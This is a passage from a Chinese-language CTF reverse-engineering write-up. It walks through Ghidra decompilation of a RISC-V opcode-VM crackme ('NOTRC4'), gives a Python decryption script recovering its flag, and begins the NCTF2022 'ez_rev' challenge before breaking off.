</span><br><span class="line">481: return</span><br></pre></td></tr></table></figure><p>定义了一个sign函数<br>以及x y<br>逐位xor后存入flag数组</p><p>最后就是创建一个RunMe CLASS<br>调用其中的函数打印flag<br>大致流程就这样吧 这鬼lemon官方文档挂了确实难搞…</p><h2 id="NOTRC4"><a href="#NOTRC4" class="headerlink" title="NOTRC4"></a>NOTRC4</h2><p>好题欸<br>RISC-V指令集<br>神奇的Ghidra可以反编译…<br>第一次使用 首先要new一个project 然后ImportFile就可以分析了<br>在IDA中也能看出来这是一个opcode的题<br>查看函数(其中有自己写的注释)<br>main</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Globals starting with &#x27;_&#x27; overlap smaller symbols at the same address */</span></span><br><span class="line"></span><br><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  undefined8 OPCODE;</span><br><span class="line">  undefined8 local_78;</span><br><span class="line">  undefined8 local_70;</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  undefined8 local_60;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined8 local_50;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  <span class="type">long</span> local_18;</span><br><span class="line">  </span><br><span class="line">  local_18 = ___stack_chk_guard;</span><br><span class="line">  OPCODE = <span class="number">0</span>;</span><br><span class="line">  local_78 = <span class="number">0</span>;</span><br><span class="line">  local_70 = <span class="number">0</span>;</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_50 = <span class="number">0</span>;</span><br><span class="line">  local_48 = <span class="number">0</span>;</span><br><span class="line">  local_40 = <span class="number">0</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">FUN_00100740</span>(<span class="string">&quot;Input your flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">FUN_00100720</span>(&amp;DAT_00100d78,&amp;INPUT_VALUE);</span><br><span class="line">  <span class="built_in">SET_OPCODE_AND_FUNCTIONS</span>((undefined4 *)&amp;OPCODE);</span><br><span class="line">  <span class="built_in">EXECUTE_UNDER_OPCODE</span>((<span class="type">int</span> *)&amp;OPCODE);</span><br><span class="line">  <span class="built_in">FUN_00100760</span>(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">  uVar1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (___stack_chk_guard != local_18) &#123;</span><br><span class="line">    <span class="built_in">FUN_00100730</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置opcode以及对应函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SET_OPCODE_AND_FUNCTIONS</span><span class="params">(undefined4 *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *param_1 = <span class="number">0</span>;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">6</span>) = <span class="number">0xf1</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">8</span>) = F1_CHECK_FLAG;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">10</span>) = <span class="number">0xf2</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0xc</span>) = F2_FUN_00100bfe;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">0xe</span>) = <span class="number">0xf3</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0x10</span>) = F3_FUN_00100974;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">0x12</span>) = <span class="number">0xf4</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0x14</span>) = F4_FUN_00100a10;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">0x16</span>) = <span class="number">0xf5</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0x18</span>) = F5_SAVE_CHANGED_VALUE;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">EXECUTE_UNDER_OPCODE</span><span class="params">(<span class="type">int</span> *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ((&amp;DAT_00102018)[*param_1] != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">EXECUTE</span>(param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的-1就是0xff 结束条件<br>先导出opcode<br>这个可以通过后面函数确定是 DAT_00102018 处的数据<br>导出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f3 00 f4 e1 f4 e2 f2 04 0b f5 f3 02 f4 e1 f4 e2 f2 04 0b f5 f1 ff</span><br></pre></td></tr></table></figure><p>可以发现其实是两组重复</p><p>F3函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F3_FUN_00100974</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* 21 74 62 64  dbt! */</span></span><br><span class="line">  *(<span class="type">long</span> *)(in_a0 + <span class="number">2</span>) =</span><br><span class="line">       *(<span class="type">long</span> *)(&amp;INPUT_VALUE + (<span class="type">long</span>)(<span class="type">int</span>)(uint)(byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] * <span class="number">8</span>) +</span><br><span class="line">       DAT_00102008;</span><br><span class="line">                    <span class="comment">/* 73 64 79 79  yyds */</span></span><br><span class="line">  *(<span class="type">long</span> *)(in_a0 + <span class="number">4</span>) =</span><br><span class="line">       *(<span class="type">long</span> *)(&amp;INPUT_VALUE + (<span class="type">long</span>)(<span class="type">int</span>)((byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] + <span class="number">1</span>) * <span class="number">8</span>) +</span><br><span class="line">       DAT_00102010;</span><br><span class="line">  *in_a0 = *in_a0 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将内存中数据注释出来 这里结合main中的输入知道是将输入分别加上了十六进制值 0x64627421 0x79796473</p><p>F4函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"><span class="comment">/* 0xe1 0xe2分别对应每次加密的两轮 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F4_FUN_00100a10</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* 0xe1 */</span></span><br><span class="line">  <span class="keyword">if</span> ((&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] == <span class="number">-0x1f</span>) &#123;</span><br><span class="line">    *(ulong *)(in_a0 + <span class="number">2</span>) =</span><br><span class="line">         DAT_00102008 +</span><br><span class="line">         ((*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &gt;&gt;</span><br><span class="line">          ((<span class="type">long</span>)-(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">4</span>) &amp; <span class="number">0x3f</span>U) |</span><br><span class="line">         (*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &lt;&lt;</span><br><span class="line">         ((<span class="type">long</span>)(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">4</span>) &amp; <span class="number">0x3f</span>U));</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* 0xe2 */</span></span><br><span class="line">  <span class="keyword">if</span> ((&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] == <span class="number">-0x1e</span>) &#123;</span><br><span class="line">    *(ulong *)(in_a0 + <span class="number">4</span>) =</span><br><span class="line">         DAT_00102010 +</span><br><span class="line">         ((*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &gt;&gt;</span><br><span class="line">          ((<span class="type">long</span>)-(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">2</span>) &amp; <span class="number">0x3f</span>U) |</span><br><span class="line">         (*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &lt;&lt;</span><br><span class="line">         ((<span class="type">long</span>)(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">2</span>) &amp; <span class="number">0x3f</span>U));</span><br><span class="line">  &#125;</span><br><span class="line">  *in_a0 = *in_a0 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>刚好对应opcode里的两个F4 分别是两组相似的加密 结合上一个函数知道这里的 <code>*int_a0+2 *int_a0+4</code> 就是两个input<br>然后到F2函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F2_FUN_00100bfe</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* if xxx&lt;0b */</span></span><br><span class="line">  <span class="keyword">if</span> (DAT_00102108 &lt; (<span class="type">int</span>)(uint)(byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">2</span>]) &#123;</span><br><span class="line">                    <span class="comment">/* opcode-4 --&gt; 回到前面两个f4开头的地方</span></span><br><span class="line"><span class="comment">                       也就是说两次f4重复了12遍！！！ */</span></span><br><span class="line">    *in_a0 = *in_a0 - (uint)(byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>];</span><br><span class="line">    DAT_00102108 = DAT_00102108 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    DAT_00102108 = <span class="number">0</span>;</span><br><span class="line">    *in_a0 = *in_a0 + <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里挺巧妙的  结合opcode的数据 f2 04 0b<br>知道这里其实是一个 0b次的循环 若&lt;0b则PC-4 也就是回到前面两个F4开始的地方<br>所以前面的两次F4重复了12次</p><p>后面的和第一轮相似 只是F3取数据从02开始取得 也就是input的后两个</p><p>最后F1函数 check函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F1_CHECK_FLAG</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (local_14 = <span class="number">0</span>; local_14 &lt; <span class="number">4</span>; local_14 = local_14 + <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">long</span> *)(&amp;DAT_001020c8 + (<span class="type">long</span>)local_14 * <span class="number">8</span>) !=</span><br><span class="line">        *(<span class="type">long</span> *)(&amp;DAT_00102030 + (<span class="type">long</span>)local_14 * <span class="number">8</span>)) &#123;</span><br><span class="line">      <span class="built_in">FUN_00100760</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">FUN_00100750</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *in_a0 = *in_a0 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 0x001020c8与0x00102030的值比较<br>在Ghidra中转到bytes查看 c8处是?说明是我们输入的数据 导出30处的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca 82 ef 95 bb 1d c2 4b be 47 b5 71 ae ec 7b f5 </span><br><span class="line">cd f6 e7 15 ab bd a1 80 85 63 77 e1 d7 93 c7 a3</span><br></pre></td></tr></table></figure><p>注意它的比较方式 long 和 +8 说明这是四个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4bc21dbb95ef82ca 0xf57becae71b547be</span><br><span class="line">0x80a1bdab15e7f6cd 0xa3c793d7e1776385</span><br></pre></td></tr></table></figure><p>对应还原加密代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="comment"># f3</span></span><br><span class="line">    <span class="built_in">input</span>[i*<span class="number">2</span>] += <span class="number">0x64627421</span></span><br><span class="line">    <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>] += <span class="number">0x79796473</span></span><br><span class="line">    v1 = <span class="built_in">input</span>[i*<span class="number">2</span>]</span><br><span class="line">    v2 = <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>): <span class="comment"># f4</span></span><br><span class="line">        <span class="comment"># 0xe1</span></span><br><span class="line">        v1 = <span class="number">0x64627421</span>+(((v2^v1)&gt;&gt;((-v2)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v2&amp;<span class="number">0x3f</span>)))</span><br><span class="line">        v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 0xe2</span></span><br><span class="line">        v2 = <span class="number">0x79796473</span>+(((v2^v1)&gt;&gt;((-v1)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v1&amp;<span class="number">0x3f</span>)))</span><br><span class="line">        v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br></pre></td></tr></table></figure><p>这种加密貌似也是一种feistel结构吧 所以加解密对称的 原来的左移改为右移 调换语句块顺序就能逆回来v1^v2的值</p><p>解密代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">opcode:</span></span><br><span class="line"><span class="string">f3 00 f4 e1 f4 e2 f2 04 0b f5 f3 02 f4 e1 f4 e2 f2 04 0b f5 f1 ff</span></span><br><span class="line"><span class="string">check值:</span></span><br><span class="line"><span class="string">ca 82 ef 95 bb 1d c2 4b be 47 b5 71 ae ec 7b f5 cd f6 e7 15 ab bd a1 80 85 63 77 e1 d7 93 c7 a3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">input</span> = [</span><br><span class="line">    <span class="number">0x4BC21DBB95EF82CA</span>,</span><br><span class="line">    <span class="number">0xF57BECAE71B547BE</span>,</span><br><span class="line">    <span class="number">0x80A1BDAB15E7F6CD</span>,</span><br><span class="line">    <span class="number">0xA3C793D7E1776385</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v1,v2</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="comment"># f3</span></span><br><span class="line">        v1 = <span class="built_in">input</span>[i*<span class="number">2</span>]</span><br><span class="line">        v2 = <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">        v1 += <span class="number">0x64627421</span></span><br><span class="line">        v2 += <span class="number">0x79796473</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>): <span class="comment"># f4</span></span><br><span class="line">            <span class="comment"># 0xe1</span></span><br><span class="line">            v1 = <span class="number">0x64627421</span>+(((v2^v1)&gt;&gt;((-v2)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v2&amp;<span class="number">0x3f</span>)))</span><br><span class="line">            v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 0xe2</span></span><br><span class="line">            v2 = <span class="number">0x79796473</span>+(((v2^v1)&gt;&gt;((-v1)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v1&amp;<span class="number">0x3f</span>)))</span><br><span class="line">            v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v1,v2</span>):</span><br><span class="line">    v2 -= <span class="number">0x79796473</span></span><br><span class="line">    v = (v2&lt;&lt;((-v1)&amp;<span class="number">0x3f</span>))|(v2&gt;&gt;(v1&amp;<span class="number">0x3f</span>))</span><br><span class="line">    v &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    v2 = v^v1</span><br><span class="line">    v2 &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    v1 -= <span class="number">0x64627421</span></span><br><span class="line">    v = (v1&lt;&lt;((-v2)&amp;<span class="number">0x3f</span>))|(v1&gt;&gt;(v2&amp;<span class="number">0x3f</span>))</span><br><span class="line">    v &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    v1 = v^v2</span><br><span class="line">    v1 &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="keyword">return</span> v1,v2</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    v1 = <span class="built_in">input</span>[i*<span class="number">2</span>]</span><br><span class="line">    v2 = <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        v1,v2 = decrypt(v1,v2)</span><br><span class="line">    v1 -= <span class="number">0x64627421</span></span><br><span class="line">    v2 -= <span class="number">0x79796473</span></span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(v1)[::-<span class="number">1</span>]+long_to_bytes(v2)[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># I_hate_U_r1sc-V!</span></span><br></pre></td></tr></table></figure><h1 id="NCTF2022"><a href="#NCTF2022" class="headerlink" title="NCTF2022"></a>NCTF2022</h1><h2 id="ez-rev"><a href="#ez-rev" class="headerlink" title="ez_rev"></a>ez_rev</h2><p>平时得多写脚本 还有端序问题啊！！！ 写个代码写了好久 难绷…<br>进IDA<br>main</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 *v4; <span class="comment">// rbx</span></span><br><span class="line">  __int128 *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;dword_55EC99F560A0);</span><br><span class="line">  <span class="keyword">if</span> ( dword_55EC99F560A0 == <span class="string">&#x27;FTCN&#x27;</span> &amp;&amp; byte_55EC99F560A4 == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; byte_55EC99F560C9 == <span class="string">&#x27;&#125;&#x27;</span> &amp;&amp; !byte_55EC99F560CA )</span><br><span class="line">  &#123;                                             <span class="comment">// len=42</span></span><br><span class="line">    v4 = (<span class="type">unsigned</span> __int8 *)&amp;unk_55EC99F560A5;  <span class="comment">// input 去头</span></span><br><span class="line">    v5 = &amp;xmmword_55EC99F560E0;                 <span class="comment">// 初始为0</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v4;</span><br><span class="line">      v4 += <span class="number">4</span>;</span><br><span class="line">      <span class="built_in">sub_55EC99F53290</span>(v6, &amp;asc_55EC99F56060, v5);<span class="comment">// v6 ~ v5  四个字符一次变换 每次变换会改变v5的值 然后后面check的xmmword就是v5值的拼接</span></span><br><span class="line">      v5 = (__int128 *)(v7 + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 != (<span class="type">unsigned</span> __int8 *)((<span class="type">char</span> *)&amp;unk_55EC99F560A5 + <span class="number">36</span>) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( xmmword_55EC99F560E0 == xmmword_55EC99F56020</span><br><span class="line">    &amp;&amp; xmmword_55EC99F560F0 == xmmword_55EC99F56030</span><br><span class="line">    &amp;&amp; dword_55EC99F56040 == dword_55EC99F56100 )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 